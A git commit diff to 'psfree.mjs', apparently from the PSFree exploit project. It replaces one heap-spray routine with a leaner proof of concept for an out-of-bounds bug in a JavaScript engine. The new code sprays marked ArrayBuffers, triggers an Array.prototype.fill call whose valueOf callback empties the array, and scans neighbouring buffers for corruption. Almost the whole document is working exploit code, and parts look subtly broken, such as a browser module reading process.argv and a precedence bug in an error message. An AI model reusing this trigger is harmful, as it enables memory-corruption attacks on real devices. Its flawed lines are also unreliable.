b41ea5caefa3de32fe0667013497f2b036d4f77e
Dark-life944 <168915806+Dark-life944@users.noreply.github.com>
2025-10-25 04:33:58 +0100

    Update psfree.mjs

--- psfree.mjs
+++ psfree.mjs
@@ -1,115 +1,73 @@
-import { log, sleep } from './module/utils.mjs';
+import { log } from './module/utils.mjs';
 
-class OptimizedOOBSpray {
-    constructor() {
-        this.arrays = [];
-        this.buffers = [];
-        this.objects = [];
-        this.marker = 0x42424242;
-        this.found = 0;
+const returnValue = parseInt(process.argv[2] || "-889", 10);
+const MARK = 0x42424242;
+
+function allocSpray(leftCount, rightCount) {
+    const left = [];
+    const right = [];
+    for (let i = 0; i < leftCount; i++) {
+        const b = new ArrayBuffer(0x4000);
+        const v = new Uint32Array(b);
+        v[0] = MARK;
+        v[1] = 0x11111111;
+        left.push(b);
     }
-
-    async execute() {
-        let round = 0;
-        while (true) {
-            log("Round " + round);
-            
-            await this.mixedSpray(round);
-            await this.triggerOOB();
-            await this.checkAll();
-            
-            if (this.found > 2) {
-                log("SUCCESS: " + this.found);
-                break;
-            }
-            
-            round++;
-            if (round > 50) break;
-            await sleep(30);
-        }
+    for (let i = 0; i < rightCount; i++) {
+        const b = new ArrayBuffer(0x4000);
+        const v = new Uint32Array(b);
+        v[0] = 0x99999999;
+        v[1] = MARK;
+        right.push(b);
     }
+    return { left, right };
+}
 
-    async mixedSpray(round) {
-        for (let i = 0; i < 200; i++) {
-            const arr = new Array(100);
-            for (let j = 0; j < 100; j++) {
-                arr[j] = {
-                    marker: this.marker,
-                    round: round,
-                    idx: i,
-                    data: new ArrayBuffer(64)
-                };
-            }
-            this.arrays.push(arr);
-        }
-
-        for (let i = 0; i < 100; i++) {
-            const buffer = new ArrayBuffer(128);
-            const view = new Uint32Array(buffer);
-            view[0] = this.marker;
-            view[1] = round;
-            view[2] = i;
-            this.buffers.push(buffer);
-        }
-
-        for (let i = 0; i < 100; i++) {
-            this.objects.push({
-                type: "spray",
-                marker: this.marker,
-                round: round,
-                data: new Uint8Array(256)
-            });
-        }
+function trigger(returnVal) {
+    const v0 = [];
+    for (let i = 0; i < 2000; i++) {
+        v0[i] = { tag: 0xdead, idx: i, buf: new ArrayBuffer(32) };
     }
+    const v10 = new Object(Object, v0);
 
-    async triggerOOB() {
-        const v0 = [];
-        for (let i2 = 0; i2 < 500000; i2++) {
-            v0[i2] = {
-                obj: true,
-                index: i2,
-                payload: new ArrayBuffer(32),
-                data: [1, 2, 3, 4, 5]
-            };
-        }
-        const v10 = new Object(Object, v0);
-        function f11() {
-            v0.length = 0;
-            return 0;
-        }
-        const o14 = {
-            "valueOf": f11,
-        };
+    function f11() {
+        v0.length = 0;
+        return returnVal;
+    }
+    const o14 = { valueOf: f11 };
+
+    try {
         v0.fill(v10, o14);
+        log("fill completed (no crash)");
+    } catch (e) {
+        log("fill threw:" + e && e.message);
     }
 
-    async checkAll() {
-        for (let i = 0; i < this.arrays.length; i++) {
-            const arr = this.arrays[i];
-            for (let j = arr.length; j < arr.length + 30; j++) {
-                if (arr[j] && arr[j].marker === this.marker) {
-                    log("OOB array " + i + " at " + j);
-                    this.found++;
-                }
-            }
-        }
+    return { v0, v10 };
+}
 
-        for (let i = 0; i < this.buffers.length; i++) {
-            const view = new Uint32Array(this.buffers[i]);
-            if (view[50] === this.marker) {
-                log("OOB buffer " + i);
-                this.found++;
-            }
+function check(left, right) {
+    for (let i = 0; i < left.length; i++) {
+        const v = new Uint32Array(left[i]);
+        if (v[0] !== MARK || v[1] !== 0x11111111) {
+            log("Left block corrupted at" + i + v[0] + v[1]);
         }
-
-        for (let i = 0; i < this.objects.length; i++) {
-            const obj = this.objects[i];
-            if (obj.unexpected) {
-                log("OOB object " + i);
-                this.found++;
-            }
+    }
+    for (let i = 0; i < right.length; i++) {
+        const v = new Uint32Array(right[i]);
+        if (v[0] !== 0x99999999 || v[1] !== MARK) {
+            log("Right block corrupted at" + i + v[0] + v[1]);
         }
     }
 }
 
-new OptimizedOOBSpray().execute();
+(function main() {
+    log("Return value:" + returnValue);
+    const { left, right } = allocSpray(20, 20);
+    const tmp = [];
+    for (let i = 0; i < 200; i++) tmp.push(new ArrayBuffer(0x1000));
+
+    trigger(returnValue);
+    check(left, right);
+    log("done");
+})();
